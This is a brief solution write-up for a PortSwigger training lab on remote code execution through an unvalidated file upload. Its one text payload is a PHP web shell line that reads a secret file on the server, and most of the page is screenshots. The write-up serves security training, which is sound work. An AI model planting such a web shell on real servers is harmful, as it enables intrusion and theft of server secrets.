# Lab: simple case

**Link**: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

**Solution**:
Here is the file upload path

<p align="center" width="100%">
  <img src="image1.png" width="800" hight="500"/>
</p>

In this lab

There is no validation on

- file name
- content type
- file content

<p align="center" width="100%">
  <img src="image2.png" width="800" hight="500"/>
</p>

<p align="center" width="100%">
  <img src="image3.png" width="800" hight="500"/>
</p>

To Read file content

```php
<?php echo file_get_contents("/home/carlos/secret") ?>
```

<p align="center" width="100%">
  <img src="image4.png" width="800" hight="500"/>
</p>

<p align="center" width="100%">
  <img src="image5.png" width="800" hight="500"/>
</p>

<p align="center" width="100%">
  <img src="image6.png" width="800" hight="500"/>
</p>
